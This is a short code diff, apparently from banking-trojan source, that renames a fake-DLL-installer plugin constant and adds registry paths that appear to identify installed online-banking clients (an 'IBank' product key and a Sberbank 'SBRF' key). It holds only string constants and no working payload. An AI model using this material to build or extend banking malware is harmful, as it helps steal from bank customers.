@@ -103,8 +103,12 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 #endif
 
 
-#ifdef HistoryAnalizerH
-	CSSTR StrHistoryAnalizerCommandParams[] = "fakedllinstaller.plug bot.plug";
+#ifdef FakeDllInstallerH
+	CSSTR EStrFakeDllInstallerCommandParams[] = "fakedllinstaller.plug bot.plug";
+
+	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
+	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
+
 #endif
 
 
